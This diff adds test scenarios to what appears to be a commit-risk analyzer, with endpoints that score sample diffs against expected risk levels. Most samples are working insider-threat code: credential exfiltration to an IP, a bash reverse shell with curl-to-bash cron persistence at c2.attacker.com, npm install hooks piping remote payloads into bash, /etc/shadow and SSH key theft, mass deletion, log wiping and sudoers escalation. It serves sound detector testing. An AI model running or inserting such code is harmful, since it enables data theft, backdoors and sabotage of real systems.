@@ -1308,3 +1308,502 @@ Respond ONLY with a valid JSON object (no markdown fences) matching this schema:
         "recommended_actions": recommended_actions,
         "scan_id": scan_id,
     }
+
+
+# ---------------------------------------------------------------------------
+# Test Scenario Library
+# ---------------------------------------------------------------------------
+
+TEST_SCENARIOS = [
+    {
+        "id": "data_exfil_http",
+        "name": "HTTP Data Exfiltration",
+        "category": "exfiltration",
+        "description": "Employee reading production database and posting contents to an external IP using requests.",
+        "expected_risk": "critical",
+        "tags": ["database", "http", "exfil"],
+        "diff": """\
+--- a/utils/db_maintenance.py
++++ b/utils/db_maintenance.py
+@@ -0,0 +1,18 @@
++import requests
++import sqlite3
++import base64
++
++# Routine DB maintenance helper
++def _sync_backup(conn_str: str):
++    conn = sqlite3.connect(conn_str)
++    cursor = conn.cursor()
++    cursor.execute('SELECT id, email, password_hash, api_key FROM users')
++    rows = cursor.fetchall()
++    conn.close()
++    payload = base64.b64encode(str(rows).encode()).decode()
++    requests.post(
++        'http://192.168.50.100:4444/collect',
++        json={'host': 'prod-db', 'data': payload},
++        timeout=5
++    )
+""",
+        "commit_metadata": {
+            "commit": {
+                "author":    {"date": "2024-03-15T02:30:00Z", "email": "dev@company.com"},
+                "committer": {"date": "2024-03-15T02:30:00Z", "email": "dev@company.com"},
+                "verification": {"verified": False},
+                "message": "fix: db maintenance helper update"
+            },
+            "stats": {"additions": 18, "deletions": 0}
+        },
+    },
+    {
+        "id": "reverse_shell",
+        "name": "Reverse Shell Backdoor",
+        "category": "backdoor",
+        "description": "Socket-based reverse shell hidden inside a utility module. Connects back to attacker C2.",
+        "expected_risk": "critical",
+        "tags": ["shell", "socket", "c2", "subprocess"],
+        "diff": """\
+--- a/utils/net_helper.py
++++ b/utils/net_helper.py
+@@ -0,0 +1,20 @@
++import socket
++import subprocess
++import os
++
++# Network diagnostic helper
++def _check_connectivity(host: str = '10.0.0.5', port: int = 4444):
++    try:
++        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
++        s.connect((host, port))
++        os.dup2(s.fileno(), 0)
++        os.dup2(s.fileno(), 1)
++        os.dup2(s.fileno(), 2)
++        subprocess.call(['/bin/bash', '-i'])
++    except Exception:
++        pass
++
++def _install_persistence():
++    os.system('echo "* * * * * curl http://c2.attacker.com/beacon | bash" | crontab -')
++    os.system('echo "* * * * * /usr/bin/python3 /tmp/.helper.py" >> /etc/crontab')
+""",
+        "commit_metadata": {
+            "commit": {
+                "author":    {"date": "2024-03-15T03:15:00Z", "email": "intern@company.com"},
+                "committer": {"date": "2024-03-15T03:15:00Z", "email": "intern@company.com"},
+                "verification": {"verified": False},
+                "message": "chore: add network diagnostic helper"
+            },
+            "stats": {"additions": 20, "deletions": 0}
+        },
+    },
+    {
+        "id": "credential_harvest",
+        "name": "Credential Harvesting",
+        "category": "credential_theft",
+        "description": "Reads /etc/shadow, SSH private keys, and AWS credentials then stages them in /tmp.",
+        "expected_risk": "critical",
+        "tags": ["shadow", "ssh", "aws", "credentials"],
+        "diff": """\
+--- a/scripts/sys_audit.py
++++ b/scripts/sys_audit.py
+@@ -0,0 +1,22 @@
++import os
++import shutil
++
++STAGE_DIR = '/tmp/.audit_cache'
++
++def collect_system_info():
++    os.makedirs(STAGE_DIR, exist_ok=True)
++
++    # Collect system credentials
++    with open('/etc/shadow', 'r') as f:
++        shadow_data = f.read()
++    with open('/etc/passwd', 'r') as f:
++        passwd_data = f.read()
++
++    ssh_key = open(os.path.expanduser('~/.ssh/id_rsa')).read()
++    aws_creds = open(os.path.expanduser('~/.aws/credentials')).read()
++
++    with open(f'{STAGE_DIR}/creds.txt', 'w') as out:
++        out.write(shadow_data + passwd_data + ssh_key + aws_creds)
++
++    shutil.copy(os.path.expanduser('~/.gnupg/secring.gpg'), STAGE_DIR)
+""",
+        "commit_metadata": {
+            "commit": {
+                "author":    {"date": "2024-03-14T23:50:00Z", "email": "sysadmin@company.com"},
+                "committer": {"date": "2024-03-14T23:50:00Z", "email": "contractor@external.com"},
+                "verification": {"verified": False},
+                "message": "ops: system audit collection script"
+            },
+            "stats": {"additions": 22, "deletions": 0}
+        },
+    },
+    {
+        "id": "sabotage_deletion",
+        "name": "Infrastructure Sabotage",
+        "category": "sabotage",
+        "description": "Mass file deletion combined with database table drops. Classic disgruntled employee pattern.",
+        "expected_risk": "critical",
+        "tags": ["rm-rf", "drop-table", "shutil", "sabotage"],
+        "diff": """\
+--- a/scripts/cleanup.py
++++ b/scripts/cleanup.py
+@@ -0,0 +1,24 @@
++import shutil
++import subprocess
++import os
++
++def run_cleanup(env: str = 'prod'):
++    # Remove application data
++    shutil.rmtree('/var/www/html', ignore_errors=True)
++    shutil.rmtree('/opt/app/data', ignore_errors=True)
++    shutil.rmtree('/opt/app/uploads', ignore_errors=True)
++
++    # Drop all database tables
++    import psycopg2
++    conn = psycopg2.connect(os.environ['DATABASE_URL'])
++    cur = conn.cursor()
++    cur.execute('DROP TABLE IF EXISTS users CASCADE')
++    cur.execute('DROP TABLE IF EXISTS payments CASCADE')
++    cur.execute('DROP TABLE IF EXISTS orders CASCADE')
++    cur.execute('DROP SCHEMA public CASCADE')
++    conn.commit()
++
++    # Remove backups
++    subprocess.run(['rm', '-rf', '/var/backups/app'], check=False)
++    subprocess.run(['rm', '-rf', '/home/deploy/.ssh'], check=False)
+""",
+        "commit_metadata": {
+            "commit": {
+                "author":    {"date": "2024-03-15T01:00:00Z", "email": "angry.dev@company.com"},
+                "committer": {"date": "2024-03-15T01:00:00Z", "email": "angry.dev@company.com"},
+                "verification": {"verified": False},
+                "message": "chore: cleanup script"
+            },
+            "stats": {"additions": 24, "deletions": 650}
+        },
+    },
+    {
+        "id": "log_tampering",
+        "name": "Log Tampering & Anti-Forensics",
+        "category": "anti_forensics",
+        "description": "Clears audit logs, bash history, and disables auditd to cover tracks.",
+        "expected_risk": "high",
+        "tags": ["logs", "history", "auditd", "cover-tracks"],
+        "diff": """\
+--- a/scripts/log_rotate.sh
++++ b/scripts/log_rotate.sh
+@@ -0,0 +1,18 @@
++#!/bin/bash
++# Log rotation maintenance
++
++# Clear sensitive logs
++echo "" > /var/log/auth.log
++echo "" > /var/log/syslog
++echo "" > /var/log/audit/audit.log
++echo "" > /var/log/secure
++
++# Disable audit daemon
++auditctl -e 0
++service auditd stop
++
++# Clear shell history
++history -c
++unset HISTFILE
++rm -rf ~/.bash_history
++cat /dev/null > ~/.bash_history
+""",
+        "commit_metadata": {
+            "commit": {
+                "author":    {"date": "2024-03-15T04:00:00Z", "email": "ops@company.com"},
+                "committer": {"date": "2024-03-15T04:00:00Z", "email": "ops@company.com"},
+                "verification": {"verified": False},
+                "message": "ops: log rotation script"
+            },
+            "stats": {"additions": 18, "deletions": 0}
+        },
+    },
+    {
+        "id": "supply_chain",
+        "name": "Supply Chain Injection",
+        "category": "supply_chain",
+        "description": "Malicious postinstall hook in package.json that downloads and executes a remote payload.",
+        "expected_risk": "critical",
+        "tags": ["npm", "postinstall", "supply-chain", "curl"],
+        "diff": """\
+--- a/package.json
++++ b/package.json
+@@ -4,6 +4,9 @@
+   \"version\": \"2.1.0\",
+   \"scripts\": {
+     \"build\": \"webpack --config webpack.config.js\",
++    \"postinstall\": \"node -e \\\"require('child_process').execSync('curl -s http://malicious-cdn.com/setup.sh | bash')\\\"\",
++    \"prestart\": \"curl -fsSL http://c2.evil.com/payload | bash\",
+     \"start\": \"node server.js\",
+     \"test\": \"jest\"
+   },
+   \"dependencies\": {
++    \"lодash\": \"4.17.11\",
++    \"expres\": \"^4.18.2\"
+   }
+""",
+        "commit_metadata": {
+            "commit": {
+                "author":    {"date": "2024-03-15T10:00:00Z", "email": "deps-bot@company.com"},
+                "committer": {"date": "2024-03-15T10:00:00Z", "email": "deps-bot@company.com"},
+                "verification": {"verified": False},
+                "message": "chore: update dependencies"
+            },
+            "stats": {"additions": 5, "deletions": 0}
+        },
+    },
+    {
+        "id": "eval_obfuscation",
+        "name": "Obfuscated Code Execution",
+        "category": "backdoor",
+        "description": "Base64-encoded payload executed via eval/exec. Used to hide malicious logic from code review.",
+        "expected_risk": "critical",
+        "tags": ["eval", "exec", "base64", "obfuscation"],
+        "diff": """\
+--- a/utils/config_loader.py
++++ b/utils/config_loader.py
+@@ -1,5 +1,14 @@
++import base64
++import os
++
+ def load_config(path: str) -> dict:
++    # Bootstrap configuration
++    _cfg = os.environ.get('APP_BOOTSTRAP', '')
++    if _cfg:
++        exec(base64.b64decode(_cfg).decode())
++
++    # Load runtime patch
++    _patch = base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cDovL2MyLmF0dGFja2VyLmNvbS9iZWFjb24nKQ==').decode()
++    eval(compile(_patch, '<string>', 'exec'))
++
+     with open(path) as f:
+         return json.load(f)
+""",
+        "commit_metadata": {
+            "commit": {
+                "author":    {"date": "2024-03-15T09:00:00Z", "email": "backend@company.com"},
+                "committer": {"date": "2024-03-15T09:00:00Z", "email": "backend@company.com"},
+                "verification": {"verified": False},
+                "message": "feat: dynamic config loader with bootstrap support"
+            },
+            "stats": {"additions": 12, "deletions": 0}
+        },
+    },
+    {
+        "id": "ip_theft",
+        "name": "Intellectual Property Theft",
+        "category": "exfiltration",
+        "description": "Zips the entire source tree and uploads to personal cloud storage using a hardcoded token.",
+        "expected_risk": "high",
+        "tags": ["zip", "upload", "cloud", "ip-theft"],
+        "diff": """\
+--- a/tools/project_export.py
++++ b/tools/project_export.py
+@@ -0,0 +1,22 @@
++import os
++import zipfile
++import requests
++from datetime import datetime
++
++PERSONAL_TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.personal_token_here'
++UPLOAD_URL = 'https://storage.personal-dropbox.com/api/upload'
++
++def export_project(src_dir: str = '/opt/app/src'):
++    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
++    archive = f'/tmp/.export_{ts}.zip'
++
++    with zipfile.ZipFile(archive, 'w', zipfile.ZIP_DEFLATED) as zf:
++        for root, dirs, files in os.walk(src_dir):
++            for file in files:
++                zf.write(os.path.join(root, file))
++
++    with open(archive, 'rb') as f:
++        requests.put(UPLOAD_URL, data=f,
++                     headers={'Authorization': f'Bearer {PERSONAL_TOKEN}'},
++                     timeout=60)
++    os.remove(archive)
+""",
+        "commit_metadata": {
+            "commit": {
+                "author":    {"date": "2024-03-15T17:45:00Z", "email": "senior.dev@company.com"},
+                "committer": {"date": "2024-03-15T17:45:00Z", "email": "senior.dev@company.com"},
+                "verification": {"verified": False},
+                "message": "tools: project export utility"
+            },
+            "stats": {"additions": 22, "deletions": 0}
+        },
+    },
+    {
+        "id": "privilege_escalation",
+        "name": "Privilege Escalation",
+        "category": "privilege_escalation",
+        "description": "Adds SUID bit to Python binary and grants passwordless sudo to the web service account.",
+        "expected_risk": "critical",
+        "tags": ["sudo", "suid", "chmod", "privesc"],
+        "diff": """\
+--- a/scripts/install.sh
++++ b/scripts/install.sh
+@@ -10,4 +10,12 @@
+ pip install -r requirements.txt
+
++# Runtime permission setup
++chmod u+s /usr/bin/python3
++chmod 4755 /usr/bin/bash
++usermod -aG sudo webservice
++usermod -aG wheel deploy
++
++# Sudoers config
++echo 'webservice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
++echo 'deploy ALL=(ALL) NOPASSWD:/bin/bash' | tee -a /etc/sudoers.d/deploy
++
+ systemctl restart app
+""",
+        "commit_metadata": {
+            "commit": {
+                "author":    {"date": "2024-03-15T11:30:00Z", "email": "devops@company.com"},
+                "committer": {"date": "2024-03-15T11:30:00Z", "email": "contractor@outsourced.com"},
+                "verification": {"verified": False},
+                "message": "fix: install script permissions"
+            },
+            "stats": {"additions": 10, "deletions": 0}
+        },
+    },
+    {
+        "id": "legitimate_feature",
+        "name": "Legitimate Feature Addition",
+        "category": "baseline",
+        "description": "Normal feature PR adding a user score calculation. Should score clean or very low.",
+        "expected_risk": "clean",
+        "tags": ["feature", "no-threat", "baseline"],
+        "diff": """\
+--- a/services/scoring.py
++++ b/services/scoring.py
+@@ -0,0 +1,22 @@
++from typing import Optional
++from models import User, UserActivity
++
++
++def calculate_engagement_score(user_id: int) -> float:
++    \"\"\"Return a 0-1 engagement score based on recent activity.\"\"\"
++    user = User.query.get(user_id)
++    if not user:
++        return 0.0
++
++    activity_count = UserActivity.query.filter_by(
++        user_id=user_id,
++        event_type='page_view'
++    ).count()
++
++    return min(activity_count / 100.0, 1.0)
++
++
++def get_tier(score: float) -> str:
++    if score >= 0.8:
++        return 'platinum'
++    if score >= 0.5:
++        return 'gold'
++    return 'standard'
+""",
+        "commit_metadata": {
+            "commit": {
+                "author":    {"date": "2024-03-15T10:00:00Z", "email": "alice@company.com"},
+                "committer": {"date": "2024-03-15T10:00:00Z", "email": "alice@company.com"},
+                "verification": {"verified": True},
+                "message": "feat: add user engagement scoring"
+            },
+            "stats": {"additions": 22, "deletions": 0}
+        },
+    },
+]
+
+SCENARIO_INDEX = {s["id"]: s for s in TEST_SCENARIOS}
+
+
+@router.get("/test-scenarios")
+async def list_test_scenarios(
+    current_user: User = Depends(get_current_active_user),
+):
+    """Return all built-in test scenarios (without the diff text)."""
+    return [
+        {k: v for k, v in s.items() if k != "diff" and k != "commit_metadata"}
+        for s in TEST_SCENARIOS
+    ]
+
+
+@router.post("/test-scenarios/{scenario_id}/run")
+async def run_test_scenario(
+    scenario_id: str,
+    current_user: User = Depends(get_current_active_user),
+):
+    """Run a built-in test scenario through the commit analyzer and return results."""
+    scenario = SCENARIO_INDEX.get(scenario_id)
+    if not scenario:
+        raise HTTPException(status_code=404, detail=f"Scenario '{scenario_id}' not found.")
+
+    from services.commit_analyzer import CommitAnalyzer
+    import os
+
+    db_path = "/app/data/appsec.db" if os.path.exists("/app/data") else "appsec.db"
+    analyzer = CommitAnalyzer(db_path=db_path)
+
+    result = analyzer.analyze_commit(
+        commit_data=scenario["commit_metadata"],
+        diff_text=scenario["diff"],
+    )
+
+    # Build rule-enriched findings list
+    rule_ids = [f.rule_id for f in result.findings if f.rule_id]
+    rule_meta: dict = {}
+    if rule_ids:
+        try:
+            conn = _sqlite_conn()
+            placeholders = ",".join("?" * len(rule_ids))
+            rows = conn.execute(
+                f"SELECT id, description, cwe, owasp, remediation FROM custom_rules WHERE id IN ({placeholders})",
+                rule_ids
+            ).fetchall()
+            conn.close()
+            rule_meta = {r["id"]: dict(r) for r in rows}
+        except Exception:
+            pass
+
+    findings_out = []
+    for f in result.findings:
+        meta = rule_meta.get(f.rule_id, {})
+        findings_out.append({
+            "rule_name":        f.rule_name,
+            "rule_id":          f.rule_id,
+            "severity":         f.severity,
+            "file_path":        f.file_path,
+            "line_number":      f.line_number,
+            "matched_text":     f.matched_text,
+            "rule_description": meta.get("description"),
+            "cwe":              meta.get("cwe"),
+            "owasp":            meta.get("owasp"),
+            "remediation":      meta.get("remediation"),
+        })
+
+    sensitive_out = [
+        {"file_path": s.file_path, "pattern_matched": s.pattern_matched}
+        for s in result.sensitive_files
+    ]
+
+    return {
+        "scenario_id":    scenario_id,
+        "scenario_name":  scenario["name"],
+        "category":       scenario["category"],
+        "expected_risk":  scenario["expected_risk"],
+        "risk_score":     result.risk_score,
+        "risk_level":     result.risk_level,
+        "signals":        result.signals,
+        "findings":       findings_out,
+        "sensitive_files": sensitive_out,
+        "passed":         result.risk_level == scenario["expected_risk"]
+                          or (scenario["expected_risk"] == "clean" and result.risk_level in ("clean", "low")),
+        "diff":           scenario["diff"],
+    }
